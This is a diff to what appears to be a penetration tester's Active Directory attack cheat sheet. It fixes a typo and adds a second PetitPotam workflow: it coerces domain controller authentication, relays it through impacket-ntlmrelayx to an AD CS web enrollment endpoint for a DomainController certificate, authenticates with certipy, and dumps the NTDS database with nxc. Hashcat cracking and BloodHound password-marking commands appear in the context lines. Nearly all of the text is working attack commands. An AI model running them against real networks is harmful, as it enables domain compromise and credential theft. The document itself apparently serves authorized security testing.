@@ -13,13 +13,25 @@ sudo hashcat --username -a 0 -m 1000 hashes --show | sed "s/^/DOMAIN.TLD\\\\/" >
 crackhound.py -f crackhound_input.txt -u neo4j -p toor -plaintext -addpw
 
 # PetitPotam
+## Variant 1
 Get PetitPotam from "topotam" (github)
 pip3 install certipy-ad
 
 python3 PetitPotam.py -u <user> -p <pass> -d <DOMAIN> -dc-ip <DCIP> <KALIIP> <DCIP>
 
-certipy-ad relay -target "http://CA.doman.tld" -template DomainController
+certipy-ad relay -target "http://CA.domain.tld" -template DomainController
 certipy-ad auth -pfx "PFXFILE" -dc-ip <DCIP>
+
+## Variant 2
+python3 PetitPotam.py -u <user> -p <pass> -d <DOMAIN> -dc-ip <DCIP> <KALIIP> <DCIP>
+
+sudo /usr/bin/impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+cat cert64 | base64 -d > cert.pfx
+certipy-ad auth -pfx "PFXFILE" -dc-ip <DCIP>
+
+nxc smb -u <dc01$> -H <NTLMHASH> -d <DOMAIN> <DCIP> --ntds
+
 
 # Insecure DNS
 nsupdate
